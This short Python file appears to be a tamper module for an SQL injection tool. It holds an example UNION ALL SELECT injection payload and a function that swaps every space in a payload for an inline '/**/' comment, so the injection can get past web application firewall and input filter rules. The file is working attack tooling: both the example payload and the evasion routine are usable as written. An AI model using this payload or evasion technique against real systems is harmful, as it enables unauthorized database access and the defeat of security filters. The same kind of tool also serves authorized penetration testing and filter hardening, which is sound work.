__example_payload__ = '484029") AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL'
__type__ = "changing the spaces in the payload into a comment"


def tamper(payload, **kwargs):
    payload = str(payload)
    retval = ""
    for char in payload:
        if char == " ":
            retval += "/**/"
        else:
            retval += char
    return retval
